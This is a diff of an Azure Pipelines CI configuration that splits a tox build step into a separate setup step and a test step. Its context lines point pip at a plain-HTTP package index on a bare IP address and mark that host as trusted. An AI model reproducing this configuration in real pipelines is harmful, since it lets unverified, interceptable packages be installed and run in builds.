@@ -23,8 +23,8 @@ jobs:
           targetType: 'inline'
           script: pip install tox pytest-azurepipelines
       - task: Bash@3
-        name: tox
-        displayName: 'Run TOX to test and build artifact'
+        name: setup
+        displayName: 'Setup the stuff'
         inputs:
           targetType: 'inline'  
           workingDirectory: $(Build.Repository.LocalPath)
@@ -32,4 +32,11 @@ jobs:
                 export HOME=$(Build.Repository.LocalPath)
                 && pip config --user set global.index-url http://18.170.223.248:8080/simple/
                 && pip config --user set global.trusted-host 18.170.223.248
-                && tox
+      - task: Bash@3
+        name: tox
+        displayName: 'Run TOX to test and build artifact'
+        inputs:
+          targetType: 'inline'  
+          workingDirectory: $(Build.Repository.LocalPath)
+          script: 
+                tox
